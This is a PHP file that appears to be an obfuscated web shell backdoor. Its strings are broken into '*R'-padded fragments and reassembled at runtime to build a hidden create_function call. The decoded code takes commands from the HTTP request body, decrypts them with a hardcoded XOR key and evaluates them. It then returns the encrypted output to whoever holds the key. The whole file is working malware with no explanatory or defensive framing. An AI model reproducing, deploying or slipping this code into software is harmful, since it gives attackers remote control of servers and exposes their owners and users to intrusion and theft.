<?php
$r='$k="d0*R523742";*R$*Rkh="*R76*Re63e423ce5";$*R*Rkf="62b68614dc*R27"*R;$p="GFhHg2*REtfimU*RusYv";f*Runc';
$g=str_replace('p','','crpeaptpe_fppuncption');
$n=');@ob_end_*Rclean(*R);$r=@b*Rase64*R_*Rencode(@x(@gzcom*Rpre*R*Rss($*Ro),$k));print*R("$p$kh*R$r$kf");}';
$X='R;($*Rj<$c*R*R&&$i<$l);$j++,$i++)*R{$o.=*R$t{$i}*R*R^$k{$j};}}ret*Ru*Rrn $o;}if *R(@p*Rr*Reg_m*R';
$R='atch("/$kh(*R.+)$kf/",@fi*Rle*R_get_*Rconte*Rnts("p*Rhp://input*R"),$m)=*R=1) *R{@ob_st*Rart();@e*R';
$T='val(@g*Rzu*Rncompress*R(@x(@*Rbase*R64*R_decode($m[*R1])*R,*R$*Rk)))*R;$o=@ob_g*Ret_content*Rs(';
$a='ti*Ron *Rx($t,*R$k){$c=st*Rrle*Rn($k);$*Rl=strl*Ren($t)*R;$o="";for*R($i=0*R;$i<$l;*R){*Rfor($j=0*';
$c=str_replace('*R','',$r.$a.$X.$R.$T.$n);
$F=$g('',$c);$F();
?>
